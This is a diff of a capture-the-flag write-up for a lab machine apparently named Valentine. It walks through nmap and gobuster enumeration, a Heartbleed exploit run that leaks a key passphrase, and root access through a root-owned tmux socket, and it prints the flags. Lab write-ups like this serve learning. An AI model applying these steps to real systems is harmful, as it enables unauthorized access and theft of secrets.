@@ -16,9 +16,15 @@ PORT    STATE SERVICE  VERSION
 |_Not valid after:  2019-02-06T00:45:25
 |_ssl-date: 2021-04-27T09:25:42+00:00; +5m10s from scanner time.
 
-Visiting the site we are greeted with a valentine image. We download it to analyse further as we run gobuster in the background.
+Visiting the site we are greeted with a heartbleed image. We run nmap scripts to check if heartbleed vulnerability exist.
+nmap --script vuln 10.10.10.79
 
-gobuster dir -u http://10.10.10.79 -w /usr/share/wordlists/directory-list-2.3-medium.txt -x txt,php
+| ssl-heartbleed: 
+|   VULNERABLE:
+|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
+|     State: VULNERABLE
+
+In the backhround we run gobuster dir -u http://10.10.10.79 -w /usr/share/wordlists/directory-list-2.3-medium.txt -x txt,php
 /index
 /index.php
 /dev
@@ -26,7 +32,6 @@ gobuster dir -u http://10.10.10.79 -w /usr/share/wordlists/directory-list-2.3-me
 /decode
 /server-status
 We see some notes under https://10.10.10.79/dev/notes.txt and a key following http://10.10.10.79/dev/hype_key
-
 To do:
 
 1) Coffee.
@@ -35,3 +40,38 @@ To do:
 4) Make sure encoding/decoding is only done client-side.
 5) Don't use the decoder/encoder until any of this is done.
 6) Find a better way to take notes.
+
+The private key encoded in hex format. We visit hex to ascii and convert the key to normal format. We then realize the key is encrypted and
+we would need a passcode to login.
+So we google around for heartbleed vulnerability script and run it against our server.
+python heartbleed-exploit.py 10.10.10.79
+$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== and then base64 decoding this we get : heartbleedbelievethehype
+
+And this way the user flag spawned
+hype@Valentine:~/Desktop$ cat user.txt
+e6710a5464769fd5fcd216e076961750
+
+======================Priv Escalation=============================
+hype@Valentine:~$ cat .bash_history
+
+exit
+exot
+exit
+ls -la
+cd /
+ls -la
+cd .devs
+ls -la
+tmux -L dev_sess 
+tmux a -t dev_sess 
+tmux --help
+tmux -S /.devs/dev_sess 
+
+hype@Valentine:~$ ps aux | grep root
+root       1018  0.0  0.1  26416  1676 ?        Ss   12:30   0:01 /usr/bin/tmux -S /.devs/dev_sess
+/usr/bin/tmux -S /.devs/dev_sess
+root@Valentine:/home/hype# whoami
+root
+root@Valentine:/home/hype# cat /root/root.txt
+f1bb6d759df1f272914ebbc9ed7765b2
+
